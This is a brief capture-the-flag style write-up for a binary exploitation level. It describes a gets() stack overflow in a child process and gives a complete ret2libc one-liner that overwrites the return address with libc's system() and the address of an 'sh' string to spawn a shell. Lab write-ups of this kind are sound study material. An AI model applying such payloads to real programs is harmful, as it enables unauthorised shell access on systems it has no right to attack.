# LEVEL 04

* after decompiling the binary:
	- we found a call to `gets()` in the child proccess.
		```c
		gets(buffer);
		```
	- we use it to overwrite `main()`'s return address with libc's `system()` address
and write as parameter "sh" string extracted from the read-only string ".gnu.hash".
 
* to exploit the vulnerability:
	- we need to execute:
		```shell
		(python -c 'from struct import *; print "a"*156 + pack("I", 0xf7e6aed0) + "aaaa" + pack("I", 0x8048312)' ; cat) | ./level04
		```
-----
### explinations:
- `0xf7e6aed0`: libc's `system()` address
- `0x8048312`: `"sh"` string address

